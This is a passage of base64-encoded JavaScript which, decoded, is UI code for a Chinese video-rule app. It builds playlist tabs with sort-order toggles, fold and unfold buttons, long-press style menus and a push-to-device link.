Ioc2hzb3J0K1xcXCJfbGlzdFxcXCIsJ1tdJykubWFwKHggPT4geC50aXRsZSArIFxcXCIkXFxcIiArIHgudXJsKS5qb2luKFxcXCIjXFxcIik7XFxuICAgICAgICAgIHZhciB0YWJzPVt0YWJzW2dldE15VmFyKHZhcmksJzAnKV1dO1xcbiAgICAgICAgICB9XFxuICAgICAgICAgIC8qbG9nKHBscylcXG4gICAgICAgICAgbG9nKHRhYnMpKi9cXG4gICAgICAgICAgfVxcbiAgICAgICAgICBpZijpgInmjqgpe1xcbiAgICAgICAgICB2YXIgcGxzPXN0b3JhZ2UwLmdldE15VmFyKHNoc29ydCtcXFwiX2R1b3NlbGVjdFxcXCIsJ1tdJykubWFwKHggPT4geC50aXRsZSArIFxcXCIkXFxcIiArIHgudXJsKS5qb2luKFxcXCIjXFxcIik7XFxuICAgICAgICAgIGlmKHBscy5sZW5ndGg9PTApe1xcbiAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/pgInmi6nkuLrnqbonO1xcbiAgICAgICAgICB9XFxuICAgICAgICAgIHZhciB0YWJzPVsn5pKt5pS+5YiX6KGoJ107XFxuICAgICAgICAgIH1cXG4gICAgICAgICAgXFxuICAgICAgICAgIHZhciBpbmZvPXN0b3JhZ2UwLmdldE15VmFyKCdlcl9pbmZvJywne30nKTtcXG4gICAgICAgICAgdmFyIGRlc2MgPWluZm9bJ2Rlc2MnXTtcXG4gICAgICAgICAgdmFyIOaOqOmAgSA9IHtcXG4gICAgICAgICAgICAgICAgIFxcXCJuYW1lXFxcIjogZ2V0UGFnZVRpdGxlKCksXFxuICAgICAgICAgICAgICAgICBcXFwiY29udGVudFxcXCI6IGRlc2N8fCcnLFxcbiAgICAgICAgICAgICAgICAgXFxcInBpY1xcXCI6IGluZm9bJ2ltZyddIHx8ICcnLFxcbiAgICAgICAgICAgICAgICAgXFxcImZyb21cXFwiOiB0YWJzLmpvaW4oJyQkJCcpLFxcbiAgICAgICAgICAgICAgICAgXFxcInVybFxcXCI6IHBscyxcXG4gICAgICAgICAgIH1cXG4gICAgICAgICAgLy9sb2co5o6o6YCBKVxcbiAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL3BhZ2UvcHVzaD9ydWxlPVhZUeaOqOmAgSZwdXNodXJsPVxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQoSlNPTi5zdHJpbmdpZnko5o6o6YCBKSlcXG4gICAgICAgICAgfSxzaHNvcnQsdmFyaSksXFxuICAgICAgICAgIGV4dHJhOntcXG4gICAgICAgICAgICBpZDpzaHNvcnQrJ19wdXNodG8nLFxcbiAgICAgICAgICAgIGNsczpzaHNvcnQrJ19wdXNodGFiJ1xcbiAgICAgICAgICB9XFxuICAgICAgICB9LHtcXG4gICAgICAgICAgY29sX3R5cGU6J2JsYW5rX2Jsb2NrJyxcXG4gICAgICAgICAgZXh0cmE6e1xcbiAgICAgICAgICAgIGNsczpzaHNvcnQrJ19wdXNodGFiJyxcXG4gICAgICAgICAgfVxcbiAgICAgICAgfSlcXG4gICAgfSxcXG4gICAgc2V0TG9uZ2NsaWNrOmZ1bmN0aW9uKHNoc29ydCxjdXN0b20pe1xcbiAgICAgIHJldHVybiBbe3RpdGxlOifmoLflvI/wn46oJyxqczogJC50b1N0cmluZygoc2hzb3J0KT0+e1xcbiAgICAgICAgICAgICAgICAgICAgbGV0IGFsbF9jb2xzID0gWycnXS5jb25jYXQoZ2V0Q29sVHlwZXMoKSk7XFxuICAgICAgICAgICAgICAgICAgICBhbGxfY29scz1hbGxfY29scy5maWx0ZXIoeD0+XFxuICAgICAgICAgICAgICAgICAgICAgIC8odGV4dF98ZmxleCkuKi8udGVzdCh4KSYmeCE9J3RleHRfaWNvbicpO1xcbiAgICAgICAgICAgICAgICAgICAgICAvL2xvZyhhbGxfY29scylcXG4gICAgICAgICAgICAgICAgICAgIGxldCBjbHMgPSBzdG9yYWdlMC5nZXRNeVZhcignZXJfcGxheWxpc3RzJywne30nKVxcbiAgICAgICAgICAgICAgICAgICAgfHwgJyc7XFxuICAgICAgICAgICAgICAgICAgICBpZihjbHNbc2hzb3J0XSE9Jycpe1xcbiAgICAgICAgICAgICAgICAgICAgICBjb2w9Y2xzW3Noc29ydF0uY29sX3R5cGU7XFxuICAgICAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgICAgICBsZXQg5oyJ6ZKu5qC35byPID0gYWxsX2NvbHMubWFwKChpdCkgPT4ge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBpdCA9PT0gY29sID8gJ/CfkYknICsgaXQ6IGl0O1xcbiAgICAgICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGlwcyA9ICfor7fpgInmi6npgInpm4bmjInpkq7moLflvI8nO1xcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICQo5oyJ6ZKu5qC35byPLCAyLCB0aXBzKS5zZWxlY3QoKHNoc29ydCxjbHMpID0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgaW5wdXQgPSBpbnB1dC5yZXBsYWNlKC/wn5GJL2csICcnKTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAvKnN0b3JhZ2UwLnNldEl0ZW0oJ+aMiemSruagt+W8jycsIGlucHV0KTsqL1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBvbGRJZHMgPSAoZmluZEl0ZW1zQnlDbHMoc2hzb3J0KSB8fCBbXSkubWFwKGl0PT5pdC5leHRyYS5pZCk7IC8v6ICB5YWD57SgaWRzXFxuICAgICAgICAgICAgICAgICAgICAgICAgb2xkSWRzLmZvckVhY2goeD0+IHtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlSXRlbSh4LCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2xfdHlwZTogaW5wdXRcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+W3suWIh+aNoumAiembhuaMiemSruagt+W8j+S4ujonICsgaW5wdXQ7XFxuICAgICAgICAgICAgICAgICAgICB9LHNoc29ydCxjbHMpO1xcbiAgICAgICAgICAgICAgICB9LHNoc29ydCxjdXN0b20pfV1cXG4gICAgfSxcXG4gICAgc2V0VGFiczogZnVuY3Rpb24odGFicywgdmFyaSwgc2hzb3J0LHBhcnNlKSB7XFxuICAgICAgICBsZXQgY3VzdG9tPXBhcnNlLuiHquWumuS5iTtcXG4gICAgICAgIGN1c3RvbSA9dGhpcy5nZXRQcmVzZXQoY3VzdG9tKTtcXG4gICAgICAgIHNoc29ydCA9IHNoc29ydCA/IHNoc29ydCA6ICdzaHNvcnQnO1xcbiAgICAgICAgdmFyIHRpdGxlID0gKGdldE15VmFyKHNoc29ydCArICdfc29ydCcsICcwJykgPT0gJzEnKSA/ICc8Yj48c3BhbiBzdHlsZT1cXFwiY29sb3I6ICcrY3VzdG9tLumAhuW6j+minOiJsisnXFxcIj7pgIbluo88L3NwYW4+PC9iPicgOiAnPGI+PHNwYW4gc3R5bGU9XFxcImNvbG9yOiAnK2N1c3RvbS7mraPluo/popzoibIrJ1xcXCI+5q2j5bqPPC9zcGFuPjwvYj4nXFxuICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiB2YXJpICsgJzonICsgdGl0bGUsXFxuICAgICAgICAgICAgZGVzYzogJ+WFsScgKyBTdHJpbmcodGFicy5sZW5ndGgpLmZvbnRjb2xvcignIzQ2ODJCNCcpICsgJ+adoee6v+i3rycsXFxuICAgICAgICAgICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChzaHNvcnQsdmFyaSxjdXN0b20pID0+IHtcXG4gICAgICAgICAgICAgIGxldCBjb25mID0gZ2V0TXlWYXIoc2hzb3J0ICsgJ19zb3J0JywgJzAnKTtcXG4gICAgICAgICAgICAgIGlmKGdldE15VmFyKCdlcl8nK3ZhcmkrJ2ZvbGQnLCcxJyk9PScwJyl7XFxuICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5bGV5byA5omN6IO95pON5L2cJztcXG4gICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgdmFyIGNsc2xpc3RzID0gZmluZEl0ZW1zQnlDbHMoc2hzb3J0KTtcXG4gICAgICAgICAgICAgICAgdmFyIG5ld2Nsc2xpc3QgPSAkLmRhdGFDb252ZXJ0KGNsc2xpc3RzKTtcXG4gICAgICAgICAgICAgICBcXG4gICAgICAgICAgICAgICB2YXIgdGl0bGVzPVtgJHtjdXN0b20u5q2j5bqP6aKc6ImyfVxcXCI+5q2j5bqPYCxgJHtjdXN0b20u6YCG5bqP6aKc6ImyfVxcXCI+6YCG5bqPYF07XFxuICAgICAgICAgICAgICAgXFxuICAgICAgICAgICAgICAgIGRlbGV0ZUl0ZW1CeUNscyhzaHNvcnQpO1xcbiAgICAgICAgICAgICAgICBuZXdjbHNsaXN0LnJldmVyc2UoKTtcXG4gICAgICAgICAgICAgICAgYWRkSXRlbUFmdGVyKHNoc29ydCArICdfbGluZScsIG5ld2Nsc2xpc3QpO1xcblxcbiAgICAgICAgICAgICAgICB2YXIgb2JqID0gZmluZEl0ZW0oc2hzb3J0ICsgJ19hdmF0YXInKVxcblxcbiAgICAgICAgICAgICAgICBpZiAoY29uZiA9PSAnMScpIHtcXG4gICAgICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oc2hzb3J0ICsgJ19hdmF0YXInLCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IG9iai50aXRsZS5yZXBsYWNlKHRpdGxlc1sxXSwgdGl0bGVzWzBdKSxcXG4gICAgICAgICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihzaHNvcnQgKyAnX3NvcnQnLCAnMCcpO1xcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICAgICAgdXBkYXRlSXRlbShzaHNvcnQgKyAnX2F2YXRhcicsIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogb2JqLnRpdGxlLnJlcGxhY2UodGl0bGVzWzBdLCB0aXRsZXNbMV0pLFxcbiAgICAgICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKHNoc29ydCArICdfc29ydCcsICcxJyk7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+WIh+aNouaOkuW6j+aIkOWKnyc7XFxuICAgICAgICAgICAgfSwgc2hzb3J0LHZhcmksY3VzdG9tKSxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ2F2YXRhcicsXFxuICAgICAgICAgICAgaW1nOiBjdXN0b20u5Zu+5qCHICxcXG4gICAgICAgICAgICBleHRyYTp7XFxuICAgICAgICAgICAgICBpZDpzaHNvcnQrJ19hdmF0YXInLFxcbiAgICAgICAgICAgICAgbG9uZ0NsaWNrOnRoaXMuc2V0TG9uZ2NsaWNrKHNoc29ydCksXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSlcXG4gICAgICAgIHZhciDmipjlj6AgPSAn4oCc4oCc4oCd4oCdPGI+JyArICfimLcnLmZvbnRjb2xvcihcXFwiI0QzRDNEM1xcXCIpO1xcbiAgICAgICAgdmFyIOWxleW8gCA9ICfigJzigJzigJ3igJ08Yj4nICsgJ+KYsCcuZm9udGNvbG9yKFxcXCIjRkZBNTAwXFxcIik7XFxuICAgICAgICB2YXIgZm9sZG5hbWUgPSAnZXJfJyt2YXJpICsgJ2ZvbGQnO1xcbiAgICAgICAgdmFyICBmb2xkID0gZ2V0TXlWYXIoZm9sZG5hbWUsICcxJyk7XFxuICAgICAgICBpZih0eXBlb2YocGFyc2VbJ+aOqOmAgSddKSE9J3VuZGVmaW5lZCcmJnBhcnNlWyfmjqjpgIEnXSlcXG4gICAgICAgIHRoaXMucHVzaFRhYignZXJfJyt2YXJpLHNoc29ydCk7XFxuICAgICAgICBcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IGZvbGQgPT09ICcwJyA/IOaKmOWPoCA6IOWxleW8gCxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcbiAgICAgICAgICAgIHVybDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZm9sZG5hbWUsc2hzb3J0KSA9PiB7XFxuICAgICAgICAgICAgICAgIHZhciAgZm9sZCA9IGdldE15VmFyKGZvbGRuYW1lLCAnMScpO1xcbiAgICAgICAgICAgICAgICB2YXIgb2JqID0gZmluZEl0ZW0oc2hzb3J0KydfbGluZScpO1xcbiAgICAgICAgICAgICAgICB2YXIgYnRuPWZpbmRJdGVtKHNoc29ydCsnX2J1dHRvbicpO1xcbiAgICAgICAgICAgICAgICB2YXIgZm9sZHM9Wyc8Zm9udCBjb2xvcj1cXFwiI0QzRDNEM1xcXCI+4pi3JywnPGZvbnQgY29sb3I9XFxcIiNGRkE1MDBcXFwiPuKYsCddO1xcbiAgICAgICAgICAgICAgICBcXG4gICAgICAgICAgICAgICAgaWYoZm9sZD09JzAnKXtcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoZm9sZG5hbWUsICAnMScpO1xcbiAgICAgICAgICAgICAgICB2YXIgY3MgPSBzdG9yYWdlMC5nZXRNeVZhcihzaHNvcnQgKyAnX2NscycpO1xcbiAgICAgICAgICAgICAgICBhZGRJdGVtQWZ0ZXIob2JqLmV4dHJhLmlkLCBjcyk7XFxuICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oYnRuLmV4dHJhLmlkLCB7XFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogYnRuLnRpdGxlLnJlcGxhY2UoZm9sZHNbMF0sIGZvbGRzWzFdKSxcXG4gICAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIGlmKGZvbGQ9PScxJyl7XFxuICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoZm9sZG5hbWUsICAnMCcpO1xcbiAgICAgICAgICAgICAgICB2YXIgcGNscyA9IGZpbmRJdGVtc0J5Q2xzKHNoc29ydCk7XFxuICAgICAgICAgICAgICAgIHZhciBjeCA9ICQuZGF0YUNvbnZlcnQocGNscyk7XFxuICAgICAgICAgICAgICAgIHN0b3JhZ2UwLnB1dE15VmFyKHNoc29ydCArICdfY2xzJywgY3gpO1xcbiAgICAgICAgICAgICAgICBkZWxldGVJdGVtQnlDbHMoc2hzb3J0KTtcXG4gICAgICAgICAgICAgICAgdXBkYXRlSXRlbShidG4uZXh0cmEuaWQsIHtcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBidG4udGl0bGUucmVwbGFjZShmb2xkc1sxXSwgZm9sZHNbMF0pLFxcbiAgICAgICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgIFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8vJyArIChmb2xkID09PSAnMScgPyAn5pS26LW3JyA6ICflsZXlvIAnKTtcXG4gICAgICAgICAgICB9LCBmb2xkbmFtZSxzaHNvcnQpLFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgIGlkOiBzaHNvcnQgKyAnX2J1dHRvbicsXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSlcXG4gICAgICAgIHRoaXMuY3JlYXRlUExpc3QodGFicyx2YXJpLHNoc29ydCxjdXN0b20pO1xcbiAgICB9LFxcbiAgICBzZXRUYWJzMjogZnVuY3Rpb24odGFicywgdmFyaSwgc2hzb3J0LHBhcnNlLGV4cCkge1xcbiAgICAgICAgbGV0IGN1c3RvbT1wYXJzZS7oh6rlrprkuYk7XFxuICAgICAgICBjdXN0b20gPXRoaXMuZ2V0UHJlc2V0KGN1c3RvbSk7XFxuICAgICAgICBcXG4gICAgICAgIHNoc29ydCA9IHNoc29ydCA/IHNoc29ydCA6ICdzaHNvcnQnO1xcbiAgICAgICAgdmFyIHRpdGxlID0gKGdldE15VmFyKHNoc29ydCArICdfc29ydCcsICcwJykgPT0gJzEnKSA/ICc8Yj48c3BhbiBzdHlsZT1cXFwiY29sb3I6JytjdXN0b20u6YCG5bqP6aKc6ImyKydcXFwiPumAhuW6jzwvc3Bhbj48L2I+JyA6ICc8Yj48c3BhbiBzdHlsZT1cXFwiY29sb3I6JytjdXN0b20u5q2j5bqP6aKc6ImyKydcXFwiPuato+W6jzwvc3Bhbj48L2I+J1xcbiAgICAgIFxcbiAgICAgICAgdmFyIOaKmOWPoCA9ICc8Yj7mipjlj6AnICsgJ+KYtycuZm9udGNvbG9yKFxcXCIjRDNEM0QzXFxcIik7XFxuICAgICAgICB2YXIg5bGV5byAID0gJzxiPuWxleW8gCcgKyAn4piwJy5mb250Y29sb3IoXFxcIiNGRkE1MDBcXFwiKTtcXG4gICAgICAgIHZhciBmb2xkbmFtZSA9ICdlcl8nICsgdmFyaSArICdmb2xkJztcXG4gICAgICAgIHZhciBmb2xkID0gZ2V0TXlWYXIoZm9sZG5hbWUsICcxJyk7XFxuXFxuICAgICAgICB2YXIgdXJsID0gJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZm9sZG5hbWUsIHNoc29ydCxwdXNoKSA9PiB7XFxuICAgICAgICAgICAgdmFyIHBsID0gc3RvcmFnZTAuZ2V0TXlWYXIoJ2VyX3BsYXlsaXN0cycsICd7fScpO1xcbiAgICAgICAgICAgIGlmIChPYmplY3Qua2V5cyhwbCkubGVuZ3RoID09IDEpIHtcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcbiAgICAgICAgICAgIH1cXG5cXG4gICAgICAgICAgICB2YXIgZm9sZCA9IGdldE15VmFyKGZvbGRuYW1lLCAnMScpO1xcbiAgICAgICAgICAgIHZhciBvYmogPSBmaW5kSXRlbShzaHNvcnQgKyAnX2F2YXRhcicpXFxuICAgICAgICAgICAgaWYgKGZvbGQgPT0gJzEnKSB7XFxuICAgICAgICAgICAgICAgIHZhciBiY2xzID0gZmluZEl0ZW0oc2hzb3J0ICsgJ19idXR0b24nKTtcXG4gICAgICAgICAgICAgICAgdmFyIHRjbHMgPSBmaW5kSXRlbXNCeUNscyhzaHNvcnQgKyAnX3RhYicpO1xcbiAgICAgICAgICAgICAgICB2YXIgbGNscyA9IGZpbmRJdGVtKHNoc29ydCArICdfbGluZScpO1xcbiAgICAgICAgICAgICAgICBcXG4gICAgICAgICAgICAgICAgdmFyIHBjbHMgPSBmaW5kSXRlbXNCeUNscyhzaHNvcnQpO1xcbiAgICAgICAgICAgICAgICB2YXIgY3MgPSBbYmNsc10uY29uY2F0KHRjbHMsIFtsY2xzXSwgcGNscyk7XFxuICAgICAgICAgICAgICAgIFxcbiAgICAgICAgICAgICAgICBpZihwdXNoKXtcXG4gICAgICAgICAgICAgICAgICB2YXIgcGNscz1maW5kSXRlbXNCeUNscyhzaHNvcnQrJ19wdXNodGFiJyk7XFxuICAgICAgICAgICAgICAgICAgY3M9cGNscy5jb25jYXQoY3MpO1xcbiAgICAgICAgICAgICAgICB9XFxuXFxuICAgICAgICAgICAgICAgIHZhciBjeCA9ICQuZGF0YUNvbnZlcnQoY3MpO1xcbiAgICAgICAgICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihzaHNvcnQgKyAnX2NscycsIGN4KTtcXG4gICAgICAgICAgICAgICAgaWYocHVzaCl7XFxuICAgICAgICAgICAgICAgICAgZGVsZXRlSXRlbUJ5Q2xzKHNoc29ydCsnX3B1c2h0YWInKTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBkZWxldGVJdGVtKGJjbHMuZXh0cmEuaWQpO1xcbiAgICAgICAgICAgICAgICBkZWxldGVJdGVtQnlDbHMoc2hzb3J0ICsgJ190YWInKTtcXG4gICAgICAgICAgICAgICAgZGVsZXRlSXRlbShzaHNvcnQgKyAnX2xpbmUnKTtcXG4gICAgICAgICAgICAgICAgZGVsZXRlSXRlbUJ5Q2xzKHNoc29ydCk7XFxuXFxuICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0ob2JqLmV4dHJhLmlkLCB7XFxuICAgICAgICAgICAgICAgICAgICBkZXNjOiBvYmouZGVzYy5yZXBsYWNlKCflsZXlvIA8Zm9udCBjb2xvcj1cXFwiI0ZGQTUwMFxcXCI+4piwJywgJ+aKmOWPoDxmb250IGNvbG9yPVxcXCIjRDNEM0QzXFxcIj7imLcnKSxcXG4gICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgaWYgKGZvbGQgPT0gJzAnKSB7XFxuICAgICAgICAgICAgICAgIHZhciBjcyA9IHN0b3JhZ2UwLmdldE15VmFyKHNoc29ydCArICdfY2xzJyk7XFxuICAgICAgICAgICAgICAgIGFkZEl0ZW1BZnRlcihzaHNvcnQgKyAnX2F2YXRhcicsIGNzKTtcXG4gICAgICAgICAgICAgICAgdXBkYXRlSXRlbShvYmouZXh0cmEuaWQsIHtcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IG9iai5kZXNjLnJlcGxhY2UoJ+aKmOWPoDxmb250IGNvbG9yPVxcXCIjRDNEM0QzXFxcIj7imLcnLCAn5bGV5byAPGZvbnQgY29sb3I9XFxcIiNGRkE1MDBcXFwiPuKYsCcpLFxcbiAgICAgICAgICAgICAgICB9KVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICBwdXRNeVZhcihmb2xkbmFtZSwgZm9sZCA9PT0gJzEnID8gJzAnIDogJzEnKTtcXG4gICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8vJyArIChmb2xkID09PSAnMScgPyAn5pS26LW3JyA6ICflsZXlvIAnKTtcXG4gICAgICAgIH0sIGZvbGRuYW1lLCBzaHNvcnQsKHBhcnNlWyfmjqjpgIEnXT90cnVlOmZhbHNlKSk7XFxuICAgICAgICB2YXIgZGVzYyA9IChmb2xkID09PSAnMCcgPyDmipjlj6AgOiDlsZXlvIApICsgJ1xcXFx0JztcXG4gICAgICAgIFxcbiAgICAgICAgaWYoZXhwLmxlbmd0aD09MSl7XFxuICAgICAgICAgICAgdXJsPSdoaWtlcjovL2VtcHR5JztcXG4gICAgICAgICAgICBkZXNjPScnO1xcbiAgICAgICAgfVxcbiAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogdmFyaSArICc6XFxcXHRcXFxcdCcgKyAn5YWxJyArIFN0cmluZyh0YWJzLmxlbmd0aCkuZm9udGNvbG9yKCcjNDY4MkI0JykgKyAn5p2h57q/6LevJyxcXG4gICAgICAgICAgICBkZXNjOiBkZXNjLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnYXZhdGFyJyxcXG4gICAgICAgICAgICBpbWc6IGN1c3RvbS7lm77moIcsXFxuICAgICAgICAgICAgdXJsOiB1cmwsXFxuICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgaWQ6IHNoc29ydCArICdfYXZhdGFyJyxcXG4gICAgICAgICAgICAgICAgbG9uZ0NsaWNrOnRoaXMuc2V0TG9uZ2NsaWNrKHNoc29ydCksXFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSlcXG4gICAgICAgIGlmKHR5cGVvZihwYXJzZVsn5o6o6YCBJ10pIT0ndW5kZWZpbmVkJyYmcGFyc2VbJ+aOqOmAgSddKVxcbiAgICAgICAgdGhpcy5wdXNoVGFiKCdlcl8nK3Zhcmksc2hzb3J0KTtcXG4gICAgICAgIFxcbiAgICAgICAgaWYgKGZvbGQgPT0gJzAnKSB7XFxuICAgICAgICAgICAgcmV0dXJuXFxuICAgICAgICB9XFxuXFxuICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdJyArIHRpdGxlLFxcbiAgICAgICAgICAgIHVybDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgodmFyaSwgc2hzb3J0LGN1c3RvbSkgPT4ge1xcbiAgICAgICAgICAgICAgICBsZXQgY29uZiA9IGdldE15VmFyKHNoc29ydCArICdfc29ydCcsICcwJyk7XFxuICAgICAgICAgICAgICAgIHZhciBjbHNsaXN0cyA9IGZpbmRJdGVtc0J5Q2xzKHNoc29ydCk7XFxuICAgICAgICAgICAgICAgIHZhciBuZXdjbHNsaXN0ID0gJC5kYXRhQ29udmVydChjbHNsaXN0cyk7XFxuICAgICAgICAgICAgICAgIGRlbGV0ZUl0ZW1CeUNscyhzaHNvcnQpO1xcbiAgICAgICAgICAgICAgICBuZXdjbHNsaXN0LnJldmVyc2UoKTtcXG4gICAgICAgICAgICAgICAgYWRkSXRlbUFmdGVyKHNoc29ydCArICdfbGluZScsIG5ld2Nsc2xpc3QpO1xcblxcbiAgICAgICAgICAgICAgICB2YXIgb2JqID0gZmluZEl0ZW0oc2hzb3J0ICsgJ19idXR0b24nKVxcbiAgICAgICAgICAgICAgICB2YXIgdGl0bGVzPVtgJHtjdXN0b20u5q2j5bqP6aKc6ImyfVxcXCI+5q2j5bqPYCxgJHtjdXN0b20u6YCG5bqP6aKc6ImyfVxcXCI+6YCG5bqPYF07XFxuICAgICAgICAgICAgICAgIFxcbiAgICAgICAgICAgICAgICBpZiAoY29uZiA9PSAnMScpIHtcXG4gICAgICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oc2hzb3J0ICsgJ19idXR0b24nLCB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IG9iai50aXRsZS5yZXBsYWNlKHRpdGxlc1sxXSwgdGl0bGVzWzBdKSxcXG4gICAgICAgICAgICAgICAgICAgIH0pXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihzaHNvcnQgKyAnX3NvcnQnLCAnMCcpO1xcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICAgICAgdXBkYXRlSXRlbShzaHNvcnQgKyAnX2J1dHRvbicsIHtcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogb2JqLnRpdGxlLnJlcGxhY2UodGl0bGVzWzBdLCB0aXRsZXNbMV0pLFxcbiAgICAgICAgICAgICAgICAgICAgfSlcXG4gICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKHNoc29ydCArICdfc29ydCcsICcxJyk7XFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgLy9yZWZyZXNoUGFnZSgpXFxuICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/liIfmjaLmjpLluo/miJDlip8nXFxuICAgICAgICAgICAgfSwgdmFyaSwgc2hzb3J0LGN1c3RvbSksXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXG4gICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICBpZDogc2hzb3J0ICsgJ19idXR0b24nLFxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0pXFxuICAgICAgICB0aGlzLmNyZWF0ZVBMaXN0KHRhYnMsdmFyaSxzaHNvcnQsY3VzdG9tKTtcXG4gICAgfSxcXG4gICAgc2V0TGlzdHM6IGZ1bmN0aW9uKGxpc3RzLCBpbmRleCwgc2hzb3J0LHBhcnNlKSB7XFxuXFxuICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihzaHNvcnQgKyAnX2xpc3QnLCBsaXN0cyk7XFxuICAgICAgICBcXG4gICAgICAgIHBhcnNlPXBhcnNlP3BhcnNlOnt9O1xcbiAgICAgICAgdmFyIOagt+W8jz1wYXJzZS7moLflvI8/cGFyc2Uu5qC35byPOicnO1xcbiAgICAgICAgdmFyIOWbvuaghz1wYXJzZS7lm77moIc/cGFyc2Uu5Zu+5qCHOidodHRwczovL2hpa2VyZmFucy5jb20vdHViaWFvL21vdmllLzEzLnN2Zyc7XFxuICAgICAgICB2YXIgYWpheD1wYXJzZS5BamF4P3BhcnNlLkFqYXg6ZmFsc2U7XFxuXFxuICAgICAgICBzaHNvcnQgPSBzaHNvcnQgPyBzaHNvcnQgOiAnc2hzb3J0JztcXG5cXG4gICAgICAgIGlmKGFqYXgpe1xcbiAgICAgICAgICAgIHZhciBsaXN0ID0gbGlzdHM7XFxuICAgICAgICAgICAgaWYgKGdldE15VmFyKHNoc29ydCArICdfc29ydCcpID09ICcxJyAmJiBsaXN0cy5sZW5ndGggPiAwKSB7XFxuICAgICAgICAgICAgICAgIGxpc3QgPSBsaXN0cy5yZXZlcnNlKCk7XFxuICAgICAgICAgICB9XFxuICAgICAgICB9ZWxzZXtcXG4gICAgICAgICAgICB2YXIgbGlzdCA9IGxpc3RzW2luZGV4XTtcXG4gICAgICAgICAgICBpZiAoZ2V0TXlWYXIoc2hzb3J0ICsgJ19zb3J0JykgPT0gJzEnICYmIGxpc3RzLmxlbmd0aCA+IDApIHtcXG4gICAgICAgICAgICAgICAgbGlzdCA9IGxpc3RzW2luZGV4XS5yZXZlcnNlKCk7XFxuICAgICAgICAgICB9XFxuICAgICAgICB9XFxuICAgICAgICBcXG4gICAgICAgIGlmKOagt+W8jz09Jycpe1xcbiAgICAgICAgICDmoLflvI89bGlzdC5sZW5ndGggPiAzID8gJ3RleHRfNCcgOiAndGV4dF8yJ1xcbiAgICAgICAgfVxcbiAgICAgICAgXFxuICAgICA